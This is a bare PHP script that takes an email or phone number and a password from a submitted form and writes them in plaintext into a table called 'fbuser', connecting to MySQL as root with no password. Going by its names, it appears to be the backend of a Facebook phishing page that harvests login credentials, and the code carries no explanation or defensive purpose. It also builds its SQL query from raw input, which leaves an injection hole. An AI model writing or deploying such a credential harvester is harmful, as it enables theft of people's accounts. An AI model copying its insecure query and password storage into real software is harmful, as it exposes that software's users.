<?php
$hostname="localhost";
$username="root";
$passwordd="";
$dbname="fbUserInformation";

$email=$_POST['email'];
$password=$_POST['password'];


$conn=new mysqli($hostname, $username, $passwordd, $dbname);
$sql="INSERT INTO fbuser (emailOrphone,password) VALUES('$email','$password')";
mysqli_query($conn, $sql);
?>